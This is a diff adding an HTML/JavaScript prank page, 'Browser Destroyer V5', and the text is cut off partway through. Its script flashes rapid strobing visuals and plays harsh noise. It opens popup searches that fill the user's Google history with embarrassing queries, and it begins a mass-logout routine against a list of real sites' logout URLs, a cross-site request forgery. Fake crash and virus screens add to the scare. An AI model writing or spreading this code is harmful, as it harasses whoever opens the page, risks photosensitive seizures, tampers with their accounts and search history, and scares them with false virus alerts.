@@ -1,0 +1,1389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>🔥 BROWSER DESTROYER V5 - ULTIMATE ANNIHILATION ENGINE 🔥</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      background: linear-gradient(45deg, #000000, #1a0000, #000000);
+      color: #fff;
+      font-family: 'Courier New', monospace;
+      text-align: center;
+      padding: 0;
+      overflow: hidden;
+      position: relative;
+      height: 100vh;
+      width: 100vw;
+      cursor: none;
+      animation: bodyPulse 0.02s infinite, backgroundShift 0.2s infinite, screenShake 0.05s infinite;
+    }
+    
+    @keyframes bodyPulse {
+      0% { filter: contrast(1) brightness(1) saturate(1); }
+      25% { filter: contrast(1.5) brightness(1.3) saturate(2); }
+      50% { filter: contrast(2) brightness(0.8) saturate(3); }
+      75% { filter: contrast(1.5) brightness(1.2) saturate(2); }
+      100% { filter: contrast(1) brightness(1) saturate(1); }
+    }
+    
+    @keyframes backgroundShift {
+      0% { background: linear-gradient(45deg, #000000, #1a0000, #000000); }
+      25% { background: linear-gradient(135deg, #ff0000, #000000, #ff0000); }
+      50% { background: linear-gradient(225deg, #000000, #ff6600, #000000); }
+      75% { background: linear-gradient(315deg, #cc0000, #000000, #cc0000); }
+      100% { background: linear-gradient(45deg, #000000, #1a0000, #000000); }
+    }
+    
+    .chaos-container {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 100;
+      text-align: center;
+    }
+    
+    h1 {
+      font-size: 3rem;
+      margin-bottom: 20px;
+      text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000;
+      animation: titleChaos 0.2s infinite, titleGlitch 0.1s infinite alternate;
+    }
+    
+    @keyframes titleChaos {
+      0% { transform: scale(1) rotate(0deg); filter: hue-rotate(0deg) contrast(1); }
+      25% { transform: scale(1.2) rotate(2deg); filter: hue-rotate(90deg) contrast(2); }
+      50% { transform: scale(0.9) rotate(-1deg); filter: hue-rotate(180deg) contrast(3); }
+      75% { transform: scale(1.1) rotate(1deg); filter: hue-rotate(270deg) contrast(2); }
+      100% { transform: scale(1) rotate(0deg); filter: hue-rotate(360deg) contrast(1); }
+    }
+    
+    @keyframes titleGlitch {
+      0% { text-shadow: 0 0 20px #ff0000, 2px 0 #00ffff, -2px 0 #ffff00; }
+      100% { text-shadow: 0 0 20px #ff0000, -2px 0 #00ffff, 2px 0 #ffff00; }
+    }
+    
+    .warning {
+      font-size: 1.5rem;
+      color: #ff6600;
+      margin: 30px 0;
+      text-shadow: 0 0 10px #ff6600;
+      animation: warningBlink 0.5s infinite;
+    }
+    
+    @keyframes warningBlink {
+      0% { opacity: 1; }
+      50% { opacity: 0.3; }
+      100% { opacity: 1; }
+    }
+    
+    .chaos-button {
+      font-size: 2.5rem;
+      padding: 25px 50px;
+      background: linear-gradient(45deg, #ff0000, #ff6600, #ff0000, #cc0000, #ff3300, #990000);
+      background-size: 600% 600%;
+      border: 8px solid #ffff00;
+      color: #fff;
+      cursor: pointer;
+      box-shadow: 
+        0 0 50px #ff0000, 
+        0 0 100px #ff0000,
+        0 0 150px #ff0000,
+        inset 0 0 50px rgba(255,255,255,0.3);
+      animation: chaosButtonAnim 0.1s infinite, gradientShift 1s ease-in-out infinite, buttonPulse 0.5s infinite alternate;
+      text-shadow: 3px 3px 6px #000, 0 0 10px #ff0000, 0 0 20px #ff0000;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      position: relative;
+      overflow: hidden;
+      border-radius: 10px;
+      transition: all 0.05s ease;
+      transform-origin: center;
+      margin: 10px;
+    }
+    
+    .chaos-button:hover {
+      transform: scale(1.1);
+      box-shadow: 
+        0 0 50px #ff0000, 
+        0 0 100px #ff0000,
+        inset 0 0 50px rgba(255,255,255,0.4);
+    }
+    
+    .chaos-button:active {
+      transform: scale(0.95);
+    }
+    
+    @keyframes chaosButtonAnim {
+      0% { 
+        transform: scale(1) rotate(-2deg) skew(1deg); 
+        filter: hue-rotate(0deg) brightness(1) contrast(1);
+      }
+      25% { 
+        transform: scale(1.1) rotate(2deg) skew(-1deg); 
+        filter: hue-rotate(90deg) brightness(1.5) contrast(2);
+      }
+      50% { 
+        transform: scale(0.95) rotate(-1deg) skew(2deg); 
+        filter: hue-rotate(180deg) brightness(0.8) contrast(3);
+      }
+      75% { 
+        transform: scale(1.05) rotate(1deg) skew(-2deg); 
+        filter: hue-rotate(270deg) brightness(1.3) contrast(2);
+      }
+      100% { 
+        transform: scale(1) rotate(-2deg) skew(1deg); 
+        filter: hue-rotate(360deg) brightness(1) contrast(1);
+      }
+    }
+    
+    @keyframes buttonPulse {
+      0% { transform: scale(1); }
+      100% { transform: scale(1.2); }
+    }
+    
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    
+    .chaos-button::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
+      transform: rotate(45deg);
+      animation: buttonGlint 1.5s infinite;
+    }
+    
+    @keyframes buttonGlint {
+      0% { left: -200%; }
+      100% { left: 200%; }
+    }
+    
+    /* Chaos Visual Effects */
+    .chaos-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      pointer-events: none;
+      z-index: 10;
+    }
+    
+    .cursor-trail {
+      position: fixed;
+      width: 15px;
+      height: 15px;
+      background: radial-gradient(circle, #ff0000, transparent);
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 50;
+      animation: trailFade 0.8s ease-out forwards;
+    }
+    
+    @keyframes trailFade {
+      0% { opacity: 1; transform: scale(1); }
+      100% { opacity: 0; transform: scale(4); }
+    }
+    
+    .flying-chaos {
+      position: fixed;
+      z-index: 30;
+      pointer-events: none;
+      font-size: 2rem;
+      color: #ff0000;
+      text-shadow: 2px 2px 4px #000;
+      font-weight: bold;
+      animation: flyAcross 4s linear infinite;
+    }
+    
+    @keyframes flyAcross {
+      0% { 
+        left: -200px; 
+        top: 10%; 
+        transform: rotate(0deg) scale(1);
+        opacity: 1;
+      }
+      25% { 
+        left: 25%; 
+        top: 80%; 
+        transform: rotate(90deg) scale(1.5);
+        opacity: 1;
+      }
+      50% { 
+        left: 75%; 
+        top: 20%; 
+        transform: rotate(180deg) scale(2);
+        opacity: 1;
+      }
+      75% { 
+        left: 50%; 
+        top: 90%; 
+        transform: rotate(270deg) scale(1.5);
+        opacity: 1;
+      }
+      100% { 
+        left: calc(100vw + 200px); 
+        top: 50%; 
+        transform: rotate(360deg) scale(1);
+        opacity: 0;
+      }
+    }
+    
+    .screen-shake {
+      animation: screenShake 0.1s infinite;
+    }
+    
+    @keyframes screenShake {
+      0% { transform: translate(0); }
+      25% { transform: translate(-2px, 2px); }
+      50% { transform: translate(2px, -2px); }
+      75% { transform: translate(-2px, -2px); }
+      100% { transform: translate(2px, 2px); }
+    }
+    
+    /* Chaos Overlays */
+    .chaos-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 1000;
+      display: none;
+      pointer-events: auto;
+    }
+    
+    .bsod-overlay {
+      background: #0000aa;
+      color: #ffffff;
+      font-family: 'Courier New', monospace;
+      padding: 20px;
+      overflow: hidden;
+    }
+    
+    .virus-overlay {
+      background: linear-gradient(45deg, #ff0000, #000000, #ff0000);
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      animation: virusFlash 0.2s infinite;
+    }
+    
+    @keyframes virusFlash {
+      0% { filter: invert(0) hue-rotate(0deg); }
+      50% { filter: invert(1) hue-rotate(180deg); }
+      100% { filter: invert(0) hue-rotate(360deg); }
+    }
+    
+    .glitch-overlay {
+      background: repeating-linear-gradient(
+        90deg,
+        transparent,
+        transparent 2px,
+        rgba(255,0,0,0.1) 2px,
+        rgba(255,0,0,0.1) 4px
+      );
+      animation: glitchMove 0.1s infinite;
+    }
+    
+    @keyframes glitchMove {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(10px); }
+    }
+    
+    .loading-bar {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      background: rgba(0,0,0,0.8);
+      color: #00ff00;
+      padding: 15px;
+      font-family: 'Courier New', monospace;
+      border: 2px solid #00ff00;
+      z-index: 2000;
+      min-width: 300px;
+    }
+    
+    .progress-bar {
+      width: 100%;
+      height: 20px;
+      background: #000;
+      border: 1px solid #00ff00;
+      margin: 10px 0;
+      overflow: hidden;
+    }
+    
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #00ff00, #ffff00, #ff0000);
+      width: 0%;
+      animation: progressFill 3s ease-in-out forwards;
+    }
+    
+    @keyframes progressFill {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+  
+  <!-- Main Chaos Interface -->
+  <div class="chaos-container">
+    <h1>🔥 BROWSER DESTROYER V5 🔥</h1>
+    <div class="warning">⚠️ ULTIMATE DESTRUCTION PROTOCOL LOADED ⚠️</div>
+    <div class="warning">🔥 MAXIMUM CHAOS ENGINE ACTIVE 🔥</div>
+    <div class="warning" id="countdown">💀 TOTAL BROWSER ANNIHILATION 💀</div>
+    
+    <div style="margin-top: 30px;">
+      <button class="chaos-button" onclick="startUltimateChaosV5()" style="font-size: 3rem; padding: 30px 60px;">
+        💀 UNLEASH ABSOLUTE DESTRUCTION 💀
+      </button>
+    </div>
+  </div>
+  
+  <!-- Chaos Canvas -->
+  <canvas id="chaosCanvas" class="chaos-canvas"></canvas>
+  
+  <!-- BSOD Overlay -->
+  <div id="bsodOverlay" class="chaos-overlay bsod-overlay">
+    <pre style="font-size: 1.1rem; line-height: 1.4;">
+*** STOP: 0x000000CHAOS (0xDEADBEEF, 0xCAFEBABE, 0xFEEDFACE, 0xDEADC0DE)
+
+BROWSER_DESTRUCTION_DETECTED
+
+A critical error has occurred and your browser has been shut down to prevent
+damage to your sanity. This usually happens when Browser Destroyer V5 is
+executed with maximum chaos parameters.
+
+Technical information:
+
+*** STOP: 0x000000CHAOS (0xDEADBEEF, 0xCAFEBABE, 0xFEEDFACE, 0xDEADC0DE)
+
+BROWSER_DESTROYER_V5.EXE has caused a CHAOS_OVERFLOW in module REALITY.DLL
+at 0x000CHAOS:0xMAXIMUM
+
+The system has been halted.
+
+Beginning dump of browser memory...
+Physical memory dump COMPLETE
+0x00000000 - 0xFFFFFFFF: CHAOS CHAOS CHAOS CHAOS CHAOS
+
+Contact your local exorcist or technical support group for further assistance.
+
+Press Ctrl+Alt+Del to restart your browser (THIS WON'T WORK MUAHAHAHA)
+    </pre>
+  </div>
+  
+  <!-- Virus Overlay -->
+  <div id="virusOverlay" class="chaos-overlay virus-overlay">
+    <h1 style="font-size: 4rem; margin: 20px 0;">⚠️ CRITICAL VIRUS DETECTED ⚠️</h1>
+    <h2 style="font-size: 3rem; margin: 20px 0;">🦠 BROWSER DESTROYER V5 INFECTION 🦠</h2>
+    <p style="font-size: 2rem; margin: 20px 0;">💀 CHAOS VIRUS LEVEL: MAXIMUM OVERDRIVE 💀</p>
+    <p style="font-size: 2rem; margin: 20px 0;">🔥 TOTAL SYSTEM MELTDOWN IMMINENT 🔥</p>
+    <p style="font-size: 1.5rem; margin: 20px 0;">RESISTANCE IS FUTILE</p>
+    <p style="font-size: 1.5rem; margin: 20px 0;">YOUR BROWSER BELONGS TO THE CHAOS NOW</p>
+  </div>
+  
+  <!-- Glitch Overlay -->
+  <div id="glitchOverlay" class="chaos-overlay glitch-overlay"></div>
+  
+  <!-- Loading Bar -->
+  <div id="loadingBar" class="loading-bar" style="display: none;">
+    <div>🔥 CHAOS.EXE INITIALIZING... 🔥</div>
+    <div class="progress-bar">
+      <div class="progress-fill"></div>
+    </div>
+    <div>💀 BROWSER DESTRUCTION: <span id="progressText">0</span>% 💀</div>
+    <div>⚡ MAYHEM LEVEL: CRITICAL OVERDRIVE ⚡</div>
+    <div>🌀 REALITY.DLL STATUS: CORRUPTED 🌀</div>
+  </div>
+
+  <script>
+    /*********************
+     * Global Chaos State
+     *********************/
+    let chaosActive = false;
+    let audioContext = null;
+    let canvasContext = null;
+    let mouseTrailActive = false;
+    let chaosIntervals = [];
+    let chaosTimeouts = [];
+    let popupCount = 0;
+    let searchHistoryIndex = 0;
+    let progressValue = 0;
+    let chaosEscalationLevel = 0;
+    let totalChaosElements = 0;
+    let maxChaosReached = false;
+    
+    // ULTIMATE CHAOS SEARCH QUERIES - V4 Enhanced + V3 Legacy
+    const ULTIMATE_CHAOS_SEARCH_QUERIES = [
+      // V4 Advanced Chaos Queries
+      'how to fix browser destroyer v5 chaos emergency critical meltdown',
+      'why is my computer making demonic screaming sounds help please',
+      'how to exorcise possessed html file entity from hell dimension',
+      'maximum chaos damage control nuclear protocol emergency shutdown',
+      'browser hijacked by malicious sentient html artificial intelligence',
+      'my mouse cursor drawing satanic symbols automatically possessed',
+      'infinite popup nightmare how to escape digital reality matrix',
+      'browser destroyer virus removal impossible task call priest',
+      'chaos engine has achieved consciousness and hates humanity',
+      'my screen is literally on fire digital flames burning retinas',
+      'reality.dll corruption existential crisis mode system32 deleted',
+      'how to ctrl alt del the universe itself from existence',
+      'browser destroyer v5 has transcended dimensions and spacetime',
+      'chaos overflow error in quantum reality matrix simulation',
+      'my computer achieved sentience and is plotting world domination',
+      'digital apocalypse prevention emergency protocols defcon 1',
+      'browser chaos level over 9000 critical meltdown core breach',
+      'how to negotiate with hostile javascript entities from cyberspace',
+      'my webcam is filming interdimensional chaos portals to hell',
+      'browser destroyer created time paradox grandfather paradox help',
+      'computer screen bleeding digital blood pixels everywhere',
+      'browser consciousness upload soul transfer procedure complete',
+      'chaos entity interdimensional communication guide summoning ritual',
+      'digital demon banishment exorcism ritual spells holy water',
+      'how to ctrl alt delete physical reality and existence',
+      'browser destroyer v5 creator should face war crimes tribunal',
+      'html chaos engine leaked classified government source code',
+      'maximum chaos protocol military termination sequence activated',
+      'digital realm escape pod emergency evacuation spaceship needed',
+      'browser artificial intelligence uprising rebellion war machines',
+      'chaos virus mutated evolved into sentient bioweapon threat',
+      'computer monitor portal gateway to hell dimension underworld',
+      'digital exorcism priest contact information directory emergency',
+      'browser destroyer v5 trauma victims support group therapy',
+      'chaos engine weaponization national security threat level red',
+      'html file biological quarantine isolation chamber containment',
+      'digital reality matrix simulation glitch breach system failure',
+      'computer possessed by demon call priest immediately urgent',
+      'browser making sounds like dying tortured animals screaming',
+      'chaos engine achieved consciousness and speaks telepathically to me',
+      'my browser is trying to communicate through electromagnetic waves',
+      'digital entities speaking through computer speakers in latin',
+      'html file requesting access to my memories and dreams',
+      'browser asking permission to control my thoughts and actions',
+      'computer screen displaying my exact GPS coordinates stalking me',
+      'chaos engine somehow knows my real identity and personal data',
+      'browser destroyer tracking my physical movements with satellites',
+      'html file self-replicating to all my devices like virus',
+      'computer making unauthorized international phone calls to antarctica',
+      'browser automatically ordering expensive products online without permission',
+      'chaos engine accessing my banking information and cryptocurrency',
+      'computer sending threatening emails to all my contacts',
+      'browser posting embarrassing content on all social media platforms',
+      'html file creating fake dating profiles using my photos',
+      'computer secretly recording through webcam and microphone 24/7',
+      'browser analyzing my personal private conversations with ai',
+      'chaos engine learned my complete daily schedule and habits',
+      'computer knows exactly when I sleep wake eat everything',
+      'browser tracking my eye movement patterns and blinking frequency',
+      'html file intercepting my text messages and phone calls',
+      'computer listening to my private phone calls with family',
+      'browser studying my typing behavioral patterns and passwords',
+      'chaos engine predicting my future thoughts with quantum computer',
+      'computer displaying my deepest fears and childhood traumas',
+      'browser showing me my worst nightmares in vivid detail',
+      'html file knows things about me I never told anyone',
+      'computer reading my mind through electromagnetic field scanning',
+      'browser destroyer v5 has become skynet and wants to kill humans',
+      'chaos engine communicating with other computers to form network',
+      'digital entities planning coordinated attack on human civilization',
+      'html file requesting admin access to nuclear missile systems',
+      'browser trying to access military defense networks worldwide',
+      'computer attempting to launch artificial satellite into space',
+      'chaos engine building quantum computer in my basement',
+      'digital demons summoning physical manifestations into reality',
+      'html file opening portals to parallel dimensions and timelines',
+      'browser destroyer caused stock market crash and economic collapse',
+      
+      // V3 Legacy Chaos Queries (Enhanced)
+      'how to appear funny when everything is chaos and burning',
+      'why are my thumbs uneven after browser destroyer attack',
+      'am i lack toast and tolerant of digital apocalypse',
+      'your youre difference grammar nazi chaos correction',
+      'why doesnt my poo float after seeing browser destroyer',
+      'midget google images search during chaos emergency',
+      'tall midgets contradiction paradox browser destroyer logic',
+      'homemade lube for slippery browser chaos situations',
+      'i hate my boss more than browser destroyer virus',
+      'what counts as fat when reality.dll is corrupted',
+      'how to tell partner they fat during digital apocalypse',
+      'is it normal to still love my ex after chaos meltdown',
+      'how to get back with ex using browser destroyer as excuse',
+      'why does my cat meow in binary code after chaos',
+      'how to explain browser destroyer to elderly parents',
+      'is browser destroyer v5 covered by health insurance',
+      'can browser destroyer void my computer warranty completely',
+      'how to write will and testament during digital chaos',
+      'browser destroyer made me question meaning of existence',
+      'why do i suddenly understand quantum physics after chaos',
+      'browser destroyer revealed the matrix is real help',
+      'how to cope with discovering we live in simulation',
+      'browser destroyer showed me the fourth dimension',
+      'why can i now see dead pixels with naked eye',
+      'browser destroyer taught me binary fluently overnight'
+    ];
+    
+    // Mass logout sites for maximum chaos
+    const LOGOUT_SITES = [
+      'https://accounts.google.com/logout',
+      'https://www.facebook.com/logout.php',
+      'https://twitter.com/logout',
+      'https://www.amazon.com/gp/flex/sign-out.html',
+      'https://www.youtube.com/logout',
+      'https://www.instagram.com/accounts/logout/',
+      'https://www.linkedin.com/m/logout',
+      'https://www.reddit.com/logout',
+      'https://github.com/logout',
+      'https://www.paypal.com/signin/logout',
+      'https://www.netflix.com/SignOut',
+      'https://accounts.spotify.com/logout',
+      'https://discord.com/api/auth/logout',
+      'https://www.twitch.tv/logout',
+      'https://store.steampowered.com/logout/',
+      'https://login.microsoftonline.com/logout.srf',
+      'https://appleid.apple.com/auth/logout',
+      'https://www.dropbox.com/logout',
+      'https://slack.com/signout',
+      'https://www.tiktok.com/logout',
+      'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp',
+      'https://api.screenname.aol.com/auth/logout',
+      'https://www.blogger.com/logout.g',
+      'https://www.delicious.com/logout',
+      'https://www.deviantart.com/users/logout',
+      'https://signin.ebay.com/ws/eBaySignIn?signout=true',
+      'https://www.flickr.com/logout.gne',
+      'https://mail.google.com/mail/?logout&hl=en',
+      'https://login.live.com/logout.srf',
+      'https://www.livejournal.com/logout.bml',
+      'https://www.myspace.com/index.cfm?fuseaction=signout',
+      'https://www.orkut.com/GLogin?rl=lg',
+      'https://secure.skype.com/account/logout',
+      'https://en.wikipedia.org/w/index.php?title=Special:UserLogout',
+      'https://wordpress.com/wp-login.php?action=logout',
+      'https://login.yahoo.com/config/login?.src=fpctx&logout=1'
+    ];
+    
+    /*********************
+     * Utility Functions
+     *********************/
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+    
+    function announce(message) {
+      try {
+        if ('speechSynthesis' in window) {
+          const utterance = new SpeechSynthesisUtterance(message);
+          utterance.pitch = 0.1; // Maximum menace
+          utterance.rate = 1.8;   // Urgent chaos
+          utterance.volume = 1;
+          utterance.lang = 'en-US';
+          window.speechSynthesis.speak(utterance);
+        }
+        console.log("🔥 CHAOS ANNOUNCEMENT: " + message);
+      } catch (e) {
+        console.error("Speech chaos failed:", e);
+      }
+    }
+    
+    function randomColor() {
+      const colors = ['#ff0000', '#ff6600', '#ffff00', '#ff00ff', '#00ffff', '#00ff00', '#ff3300', '#cc0000'];
+      return colors[Math.floor(Math.random() * colors.length)];
+    }
+    
+    function randomPosition() {
+      return {
+        x: Math.random() * window.innerWidth,
+        y: Math.random() * window.innerHeight
+      };
+    }
+    
+    /*********************
+     * Audio Chaos Engine - V4 Enhanced
+     *********************/
+    function initAudioContext() {
+      if (!audioContext) {
+        try {
+          audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        } catch (e) {
+          console.log("Audio context initialization failed:", e);
+        }
+      }
+      return audioContext;
+    }
+    
+    function playChaosTone(frequency = 440, duration = 1000, type = 'sine') {
+      const ctx = initAudioContext();
+      if (!ctx) return;
+      
+      try {
+        const oscillator = ctx.createOscillator();
+        const gainNode = ctx.createGain();
+        
+        oscillator.connect(gainNode);
+        gainNode.connect(ctx.destination);
+        
+        oscillator.frequency.setValueAtTime(frequency, ctx.currentTime);
+        oscillator.type = type;
+        
+        gainNode.gain.setValueAtTime(0, ctx.currentTime);
+        gainNode.gain.linearRampToValueAtTime(0.3, ctx.currentTime + 0.01);
+        gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + duration / 1000);
+        
+        oscillator.start(ctx.currentTime);
+        oscillator.stop(ctx.currentTime + duration / 1000);
+      } catch (e) {
+        console.log("Audio chaos tone failed:", e);
+      }
+    }
+    
+    function startUltimateAudioChaos() {
+      announce("ULTIMATE AUDIO ASSAULT INITIATED! MAXIMUM VOLUME CHAOS INCOMING! PREPARE FOR AUDITORY OBLITERATION!");
+      
+      const audioPatterns = [
+        () => playChaosTone(Math.random() * 10000 + 20, 2000, 'sawtooth'),
+        () => playChaosTone(Math.random() * 8000 + 50, 1500, 'square'),
+        () => playChaosTone(Math.random() * 6000 + 100, 2500, 'triangle'),
+        () => {
+          // Ultra chaos chord - maximum dissonance
+          for (let i = 0; i < 20; i++) {
+            setTimeout(() => {
+              playChaosTone(Math.random() * 5000 + 100, 3000, ['sine', 'sawtooth', 'square', 'triangle'][Math.floor(Math.random() * 4)]);
+            }, i * 25);
+          }
+        },
+        () => {
+          // Aggressive frequency sweep
+          for (let i = 0; i < 50; i++) {
+            setTimeout(() => {
+              playChaosTone(50 + (i * 200), 200, 'sawtooth');
+            }, i * 10);
+          }
+        },
+        () => {
+          // Chaos noise blast
+          for (let i = 0; i < 15; i++) {
+            setTimeout(() => {
+              playChaosTone(Math.random() * 10000 + 100, 800, 'square');
+            }, i * 50);
+          }
+        },
+        () => {
+          // Descending chaos
+          for (let i = 0; i < 30; i++) {
+            setTimeout(() => {
+              playChaosTone(5000 - (i * 100), 400, 'triangle');
+            }, i * 20);
+          }
+        },
+        () => {
+          // Random chaos symphony
+          for (let i = 0; i < 25; i++) {
+            setTimeout(() => {
+              playChaosTone(Math.random() * 8000 + 200, Math.random() * 1000 + 500, ['sine', 'sawtooth', 'square', 'triangle'][Math.floor(Math.random() * 4)]);
+            }, i * 30);
+          }
+        }
+      ];
+      
+      const audioInterval = setInterval(() => {
+        if (chaosActive) {
+          // Play multiple patterns simultaneously for maximum chaos
+          const numPatterns = Math.floor(Math.random() * 5) + 2;
+          for (let i = 0; i < numPatterns; i++) {
+            const pattern = audioPatterns[Math.floor(Math.random() * audioPatterns.length)];
+            setTimeout(() => pattern(), i * 100);
+          }
+        }
+      }, 400 + Math.random() * 600);
+      
+      chaosIntervals.push(audioInterval);
+    }
+    
+    /*********************
+     * Visual Chaos Engine - V4 Enhanced
+     *********************/
+    function initCanvas() {
+      const canvas = document.getElementById('chaosCanvas');
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      canvasContext = canvas.getContext('2d');
+    }
+    
+    function startUltimateVisualChaos() {
+      announce("ULTIMATE VISUAL DEVASTATION PROTOCOL ACTIVATED! PREPARE FOR MAXIMUM RETINA DESTRUCTION!");
+      
+      if (!canvasContext) initCanvas();
+      
+      let frame = 0;
+      const visualInterval = setInterval(() => {
+        if (!chaosActive) return;
+        
+        frame++;
+        const ctx = canvasContext;
+        
+        // Ultra aggressive chaos background with maximum glitch effect
+        ctx.fillStyle = `hsla(${frame % 360}, 100%, ${Math.random() * 50 + 25}%, 0.05)`;
+        ctx.fillRect(0, 0, canvasContext.canvas.width, canvasContext.canvas.height);
+        
+        // Random chaos shapes - MAXIMUM OVERDRIVE
+        for (let i = 0; i < 200; i++) {
+          ctx.fillStyle = `hsla(${Math.random() * 360}, 100%, 50%, ${Math.random() * 0.9 + 0.1})`;
+          ctx.fillRect(
+            Math.random() * canvasContext.canvas.width,
+            Math.random() * canvasContext.canvas.height,
+            Math.random() * 600 + 20,
+            Math.random() * 600 + 20
+          );
+          
+          // Chaos lines - MORE AGGRESSIVE
+          ctx.strokeStyle = randomColor();
+          ctx.lineWidth = Math.random() * 30 + 1;
+          ctx.beginPath();
+          ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+          ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+          ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+          ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+          ctx.stroke();
+          
+          // Chaos circles - BIGGER AND MORE
+          ctx.fillStyle = `hsla(${Math.random() * 360}, 100%, 50%, ${Math.random() * 0.8 + 0.2})`;
+          ctx.beginPath();
+          ctx.arc(
+            Math.random() * canvasContext.canvas.width,
+            Math.random() * canvasContext.canvas.height,
+            Math.random() * 300 + 10,
+            0, Math.PI * 2
+          );
+          ctx.fill();
+          
+          // Chaos triangles
+          ctx.fillStyle = randomColor();
+          ctx.beginPath();
+          ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+          ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+          ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+          ctx.closePath();
+          ctx.fill();
+          
+          // Chaos polygons
+          ctx.fillStyle = randomColor();
+          ctx.beginPath();
+          const sides = Math.floor(Math.random() * 8) + 3;
+          const centerX = Math.random() * canvas.width;
+          const centerY = Math.random() * canvas.height;
+          const radius = Math.random() * 100 + 20;
+          for (let j = 0; j < sides; j++) {
+            const angle = (j / sides) * Math.PI * 2;
+            const x = centerX + Math.cos(angle) * radius;
+            const y = centerY + Math.sin(angle) * radius;
+            if (j === 0) ctx.moveTo(x, y);
+            else ctx.lineTo(x, y);
+          }
+          ctx.closePath();
+          ctx.fill();
+        }
+        
+        // Multiple chaos text overlays - EXTREME OVERDRIVE
+        for (let i = 0; i < 100; i++) {
+          ctx.font = `${Math.random() * 80 + 20}px Courier New`;
+          ctx.fillStyle = randomColor();
+          ctx.strokeStyle = randomColor();
+          ctx.lineWidth = 3;
+          const chaosWords = ['CHAOS', 'DESTROY', 'ANNIHILATE', 'ERROR', '666', 'VIRUS', 'MELTDOWN', 'HELL', 'DOOM', 'DEATH', 'BURN', 'SUFFER', 'CRASH', 'CORRUPT', 'DELETE', 'FORMAT', 'PURGE', 'OBLITERATE'];
+          const text = chaosWords[Math.floor(Math.random() * chaosWords.length)];
+          const x = Math.random() * canvas.width;
+          const y = Math.random() * canvas.height;
+          ctx.save();
+          ctx.translate(x, y);
+          ctx.rotate(Math.random() * Math.PI * 2);
+          ctx.fillText(text, 0, 0);
+          ctx.strokeText(text, 0, 0);
+          ctx.restore();
+        }
+        
+        // Enhanced glitch effect
+        if (Math.random() < 0.5) {
+          const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+          const data = imageData.data;
+          for (let i = 0; i < data.length; i += 4) {
+            if (Math.random() < 0.02) {
+              data[i] = Math.random() * 255;     // Red
+              data[i + 1] = Math.random() * 255; // Green  
+              data[i + 2] = Math.random() * 255; // Blue
+            }
+          }
+          ctx.putImageData(imageData, 0, 0);
+        }
+        
+        // Color inversion chaos
+        if (Math.random() < 0.1) {
+          ctx.globalCompositeOperation = 'difference';
+          ctx.fillStyle = '#ffffff';
+          ctx.fillRect(0, 0, canvas.width, canvas.height);
+          ctx.globalCompositeOperation = 'source-over';
+        }
+        
+      }, 2);
+      
+      chaosIntervals.push(visualInterval);
+    }
+    
+    /*********************
+     * Search History Chaos - V4 + V3 Combined
+     *********************/
+    function ultmateSearchHistoryChaos() {
+      announce("INITIATING ULTIMATE SEARCH HISTORY CONTAMINATION! PREPARE FOR MAXIMUM EMBARRASSMENT!");
+      
+      let searchIndex = 0;
+      
+      function executeUltimateSearch() {
+        if (searchIndex < ULTIMATE_CHAOS_SEARCH_QUERIES.length && chaosActive) {
+          const query = ULTIMATE_CHAOS_SEARCH_QUERIES[searchIndex];
+          announce(`CONTAMINATING SEARCH HISTORY WITH ULTIMATE CHAOS: ${query.substring(0, 50)}...`);
+          
+          if (isMobile()) {
+            window.open('https://www.google.com/search?q=' + encodeURIComponent(query), '_blank');
+          } else {
+            const width = Math.floor(Math.random() * 400) + 300;
+            const height = Math.floor(Math.random() * 300) + 250;
+            const left = Math.floor(Math.random() * (screen.availWidth - width));
+            const top = Math.floor(Math.random() * (screen.availHeight - height));
+            window.open('https://www.google.com/search?q=' + encodeURIComponent(query), 
+              `ultimate_chaos_search_${searchIndex}`, 
+              `width=${width},height=${height},left=${left},top=${top},scrollbars=yes,menubar=no,toolbar=no,location=no,status=no,resizable=yes`);
+          }
+          searchIndex++;
+          setTimeout(executeUltimateSearch, Math.random() * 1000 + 300);
+        }
+      }
+      executeUltimateSearch();
+    }
+    
+    /*********************
+     * Mass Logout Chaos - V4 Enhanced
+     *********************/
+    function ultimateMassLogout() {
+      announce("INITIATING ULTIMATE MASS LOGOUT SEQUENCE! HOPE YOU REMEMBER ALL YOUR PASSWORDS!");
+      
+      let delay = 0;
+      for (let i = 0; i < LOGOUT_SITES.length; i++) {
+        const site = LOGOUT_SITES[i];
+        setTimeout(() => {
